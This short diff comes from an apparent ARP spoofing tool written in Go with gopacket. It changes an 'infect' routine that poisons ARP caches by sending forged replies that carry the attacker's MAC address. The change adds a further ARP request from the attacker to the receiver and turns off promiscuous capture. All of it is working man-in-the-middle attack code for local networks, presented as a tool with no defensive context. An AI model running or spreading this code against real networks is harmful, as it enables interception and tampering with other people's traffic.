@@ -36,7 +36,7 @@ type Session struct {
 
 var (
 	snapshotLen = int32(math.MaxInt32)
-	promiscuous = true
+	promiscuous = false
 	timeout     = time.Millisecond
 
 	options gopacket.SerializeOptions
@@ -238,6 +238,12 @@ func (s *Session) infect(handle *pcap.Handle, attacker *Host) {
 				SrcProtAddress: s.Sender.IP,
 				SrcHwAddress:   attacker.MAC,
 			}, layers.ARPReply)
+			sendARP(handle, &AddressPair{
+				DstProtAddress: s.Receiver.IP,
+				DstHwAddress:   s.Receiver.MAC,
+				SrcProtAddress: attacker.IP,
+				SrcHwAddress:   attacker.MAC,
+			}, layers.ARPRequest)
 			// case <-ticker3min:
 			// 	log.Println("Infection End.", s)
 			// 	s.recovery(attacker)
